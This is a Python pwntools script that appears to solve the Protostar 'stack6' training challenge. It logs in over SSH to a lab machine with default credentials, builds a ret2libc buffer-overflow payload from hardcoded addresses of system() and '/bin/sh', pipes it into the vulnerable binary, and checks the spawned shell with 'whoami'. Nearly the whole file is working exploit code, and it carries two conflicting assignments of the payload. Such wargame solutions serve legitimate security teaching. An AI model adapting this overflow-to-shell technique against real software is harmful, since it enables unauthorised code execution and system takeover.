#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='172.16.17.27', user='user', password='user', port=22)
sh = s.run('bash')
# overflowing the buffer modifies the stack
# address of system:
system = b'\xb0\xff\xec\xb7'
# now to call /bin/sh after system we use by calling strings on libc
# we find an address with /bin/sh via grep
# gdb info proc mappings tells us the address of libc is 0xb7e97000
binsh = p32(1176511+0xb7e97000)
exploit = b'( python -c \'print "a"*64+"\x90"*12+"'
exploit += system+b'"+"'+binsh+b'"'
exploit += b'\'; cat ) | /opt/protostar/bin/stack6; whoami'
exploit = '( python -c \'print "\\x90"*80+"\\xb0\\xff\\xec\\xb7"+"\\x90"*4+"\\xbfc\\xfb\\xb7"\'; cat ) | /opt/protostar/bin/stack6'
print(exploit)
sh.sendline(exploit)
# shell has been spawned sending whoami to check permissions
sh.sendline('whoami')
print(sh.recvline(timeout=1))
log.info(sh.recvline(timeout=1).decode('utf-8'))
